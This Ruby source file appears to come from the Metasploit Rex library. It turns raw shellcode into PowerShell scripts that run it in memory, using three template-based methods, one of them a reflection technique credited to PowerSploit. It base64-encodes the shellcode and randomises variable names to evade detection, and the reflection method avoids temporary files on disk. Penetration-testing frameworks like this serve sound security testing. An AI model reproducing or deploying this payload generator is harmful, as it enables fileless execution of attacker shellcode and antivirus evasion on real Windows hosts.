# -*- coding: binary -*-
require 'rex/random_identifier_generator'

module Rex
module Powershell
module Payload

  def self.read_replace_script_template(template_path, filename, hash_sub)
    template_pathname = File.join(template_path, filename)
    template = ''
    File.open(template_pathname, "rb") {|f| template = f.read}
    template % hash_sub
  end

  def self.to_win32pe_psh_net(template_path, code)
    rig = Rex::RandomIdentifierGenerator.new()
    rig.init_var(:var_code)
    rig.init_var(:var_kernel32)
    rig.init_var(:var_baseaddr)
    rig.init_var(:var_threadHandle)
    rig.init_var(:var_output)
    rig.init_var(:var_codeProvider)
    rig.init_var(:var_compileParams)
    rig.init_var(:var_syscode)
    rig.init_var(:var_temp)

    hash_sub = rig.to_h
    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)

    read_replace_script_template(template_path, "to_mem_dotnet.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
  end

  def self.to_win32pe_psh(template_path, code)
    hash_sub = {}
    hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_win32_func]	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_payload] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_size] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_rwx] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_iter] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)

    hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])

    read_replace_script_template(template_path, "to_mem_old.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
  end

  #
  # Reflection technique prevents the temporary .cs file being created for the .NET compiler
  # Tweaked by shellster
  # Originally from PowerSploit
  #
  def self.to_win32pe_psh_reflection(template_path, code)
    # Intialize rig and value names
    rig = Rex::RandomIdentifierGenerator.new()
    rig.init_var(:func_get_proc_address)
    rig.init_var(:func_get_delegate_type)
    rig.init_var(:var_code)
    rig.init_var(:var_module)
    rig.init_var(:var_procedure)
    rig.init_var(:var_unsafe_native_methods)
    rig.init_var(:var_parameters)
    rig.init_var(:var_return_type)
    rig.init_var(:var_type_builder)
    rig.init_var(:var_buffer)
    rig.init_var(:var_hthread)

    hash_sub = rig.to_h
    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)

    read_replace_script_template(template_path,
                                 "to_mem_pshreflection.ps1.template",
                                 hash_sub).gsub(/(?<!\r)\n/, "\r\n")
  end

end
end
end
